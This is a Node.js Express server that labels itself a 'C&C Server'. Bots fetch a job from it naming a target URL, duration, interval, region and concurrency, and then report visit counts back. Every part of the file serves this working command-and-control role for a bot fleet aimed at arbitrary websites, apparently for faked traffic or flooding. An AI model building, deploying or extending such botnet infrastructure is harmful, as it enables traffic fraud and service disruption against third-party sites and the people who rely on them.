const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const CONFIG_FILE = path.join(__dirname, 'config.json');

app.use(cors());
app.use(express.json());

// ---------------------------
//       DEFAULT JOB
// ---------------------------
let currentJob = {
    targetUrl: "https://example.com",
    duration: 30000,
    interval: 5000,
    region: null,
    concurrency: 5
};

// ---------------------------
//   LOAD SAVED CONFIG
// ---------------------------
if (fs.existsSync(CONFIG_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
        currentJob = { ...currentJob, ...saved };
        console.log("[*] Loaded saved config:", currentJob);
    } catch (err) {
        console.log("[-] Failed to read config:", err.message);
    }
}

// ---------------------------
//        STATS
// ---------------------------
let stats = {
    totalVisits: 0,
    visitsByUrl: {}
};

// ---------------------------
//     API ROUTES
// ---------------------------

// Give job to bot
app.get('/api/job', (req, res) => {
    res.json(currentJob);
});

// Update job from panel
app.post('/api/job', (req, res) => {
    const { targetUrl, duration, interval, region, concurrency } = req.body;

    currentJob = {
        targetUrl: targetUrl || currentJob.targetUrl,
        duration: parseInt(duration) || 30000,
        interval: parseInt(interval) || 5000,
        region: region || null,
        concurrency: parseInt(concurrency) || 5
    };

    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(currentJob, null, 2));
    } catch (err) {
        console.log("[-] Failed to save config:", err.message);
    }

    res.json({ success: true, job: currentJob });
});

// Receive visit report from bot
app.post('/api/report-visit', (req, res) => {
    const { url } = req.body;

    if (!url) return res.status(400).json({ error: "URL required" });

    stats.totalVisits++;
    stats.visitsByUrl[url] = (stats.visitsByUrl[url] || 0) + 1;

    console.log(`[+] Visit reported for ${url}. Total: ${stats.totalVisits}`);
    res.json({ success: true });
});

// Get stats
app.get('/api/stats', (req, res) => {
    res.json(stats);
});

// Health check for Render & bots
app.get('/ping', (req, res) => {
    res.json({ alive: true, timestamp: Date.now() });
});

// ---------------------------
//   STATIC FRONTEND FILES
// ---------------------------
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ---------------------------
app.listen(PORT, () => {
    console.log(`[+] C&C Server online → Port ${PORT}`);
});
